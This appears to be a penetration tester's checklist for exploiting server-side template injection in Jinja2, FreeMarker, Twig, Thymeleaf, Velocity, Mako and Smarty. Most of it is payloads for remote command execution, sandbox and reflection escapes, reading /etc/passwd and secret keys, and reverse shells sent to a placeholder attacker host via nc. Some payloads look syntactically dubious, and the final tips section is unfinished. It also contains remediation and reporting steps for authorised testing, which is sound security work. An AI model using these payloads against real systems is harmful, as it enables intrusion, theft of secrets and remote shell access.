# SSTI Testing Checklist for Various Template Engines

## Phase 1: Initial Discovery
1. **Detect Template Injection Points**:
   - Inject basic expressions to see if template syntax is evaluated. Each template engine has different syntax, so try variations:
     - **Jinja2** (Python): `{{7*7}}`, `{{request.__class__}}`
     - **Thymeleaf** (Java): `#{7*7}`
     - **Mako** (Python): `${7*7}`
     - **FreeMarker** (Java): `${7*7}`
     - **Twig** (PHP): `{{7*7}}`
     - **Velocity** (Java): `#set($x = 7*7)`

2. **Identify the Template Engine**:
   - Inject version-specific payloads or syntax and analyze the error messages or responses to determine the template engine:
     ```plaintext
     {{1+1}}  --> Jinja2 or Twig
     ${7*7}   --> FreeMarker or Mako
     #{7*7}   --> Thymeleaf
     ```
   - Review stack traces for template engine references.

---

## Phase 2: Enumeration and Exploration
3. **List Available Variables and Methods**:
   - Explore objects, methods, and data models exposed by the template engine:
     - **Jinja2**: `{{ [].class.base }}`
     - **FreeMarker**: `${.data_model?keys}`
     - **Twig**: `{{ _self.getEnvironment() }}`
     - **Thymeleaf**: `#context.variables`
     - **Velocity**: `#foreach($k in $context.keys()) $k: $context.get($k)`

4. **Check for Access to Dangerous Methods**:
   - Test if you can access classes, objects, or methods that may lead to code execution:
     - **Jinja2**:
       ```python
       {{ config.items() }}
       {{ ''.__class__.__mro__[1].__subclasses__() }}
       ```
     - **FreeMarker**:
       ```freemarker
       ${"".getClass().forName("java.lang.Runtime")}
       ```
     - **Twig**:
       ```php
       {{ constant('php_uname') }}
       ```

5. **Identify Dangerous Functions or Reflection Capabilities**:
   - Check for access to built-in functions or reflection:
     - **Jinja2**: `{{ ''.__class__.__mro__[1].__subclasses__()[59]('cat /etc/passwd',shell=True,stdout=-1).communicate() }}`
     - **FreeMarker**:
       ```freemarker
       ${"java.io.File".new("/etc/passwd").read()}
       ```
     - **Twig**:
       ```php
       {{ system('id') }}
       ```

---

## Phase 3: Exploitation Techniques
6. **Exploit Command Execution**:
   - Depending on the access, try executing OS commands:
     - **Jinja2**:
       ```python
       {{ ''.__class__.__mro__[1].__subclasses__()[59]('cat /etc/passwd',shell=True,stdout=-1).communicate() }}
       ```
     - **FreeMarker**:
       ```freemarker
       ${"".getClass().forName("java.lang.Runtime").getRuntime().exec("whoami")}
       ```
     - **Twig**:
       ```php
       {{ system('id') }}
       ```

7. **Leverage Reflection for RCE**:
   - Use reflection methods to call dangerous methods:
     - **Java-based Engines**:
       ```java
       ${"".getClass().forName("java.lang.Runtime").getMethod("exec", "java.lang.String").invoke("whoami")}
       ```
     - **Python-based Engines**: Use `__class__` and `__subclasses__` to access dangerous classes.

8. **Accessing Scripting Engines**:
   - **Java**: Use `javax.script.ScriptEngineManager` if accessible:
     ```freemarker
     ${"javax.script.ScriptEngineManager".new().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('whoami')")}
     ```
   - **Groovy or Python**: Execute scripts if a scripting engine is exposed.

---

## Phase 4: Bypassing Sandboxing and Restrictions
9. **Break Out of Sandboxes**:
   - **Jinja2 Sandbox**: Access Python’s internal classes:
     ```python
     {{ ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['sys'].modules['os'].system('whoami') }}
     ```
   - **Twig**: If `constant` or `eval` functions are available, attempt to invoke PHP functions:
     ```php
     {{ eval('phpinfo()') }}
     ```
   - **Thymeleaf/Java**: Look for ways to access runtime classes:
     ```java
     ${T(java.lang.Runtime).getRuntime().exec('whoami')}
     ```

10. **Bypass Security Manager**:
    - **Java Engines**: Look for classes not properly sandboxed by the Security Manager:
      ```java
      ${"java.lang.System".getProperty("user.home")}
      ```

11. **Leverage `ClassLoader`**:
    - Use `ClassLoader` to load classes that might be restricted:
      ```freemarker
      ${"".getClass().getClassLoader().loadClass("java.lang.Runtime").getRuntime().exec("whoami")}
      ```

---

## Phase 5: Advanced Enumeration and Post-Exploitation
12. **File System Access**:
    - **Read Files**:
      - **Jinja2**:
        ```python
        {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
        ```
      - **FreeMarker**:
        ```freemarker
        ${"java.io.File".new("/etc/passwd").read()}
        ```
    - **Write Files**:
      - Attempt to write files for persistence or reverse shells.

13. **Extract Sensitive Information**:
    - **Read Environment Variables**:
      ```freemarker
      ${"java.lang.System".getenv()}
      ```
      ```python
      {{ config['SECRET_KEY'] }}
      ```

14. **Execute Reverse Shells**:
    - **Jinja2**:
      ```python
      {{ ''.__class__.__mro__[1].__subclasses__()[59]('nc -e /bin/sh attacker-ip 4444',shell=True) }}
      ```
    - **FreeMarker**:
      ```freemarker
      ${"".getClass().forName("java.lang.Runtime").getRuntime().exec("nc -e /bin/bash attacker-ip 4444")}
      ```

---

## Phase 6: Cleanup and Reporting
15. **Document Findings**:
    - Record each step, payload, and results.
    - Capture screenshots of successful injections and RCE.
    - Explain the impact of each finding and how it could be abused in a real-world scenario.

16. **Suggest Remediation**:
    - Disable unsafe template functions or expressions.
    - Implement input validation and escaping before rendering in templates.
    - Use template engine versions that provide robust sandboxing.

17. **Remove Artifacts**:
    - Clean up any files or commands executed during testing.
    - Remove reverse shells or other persistent mechanisms.

---

## Template-Specific Techniques
- **Mako (Python)**:
  - Direct access to Python internals is possible through `${}` expressions.
  - Example for executing commands:
    ```python
    <%!
    import os
    %>
    ${os.system('ls')}
    ```

- **Smarty (PHP)**:
  - Check for PHP function access through `eval` or `include`:
    ```php
    {php} echo system('whoami'); {/php}
    ```

- **Velocity (Java)**:
  - Exploit `#set` to create and manipulate objects:
    ```velocity
    #set($runtime = "java.lang.Runtime")
    #set($exec = $runtime.getRuntime().exec("whoami"))
    ```

---

## TEPS 
- try to fiend where the input is reflected 
- try to read the file of the template to know all the classes and the functions to invoke 
- 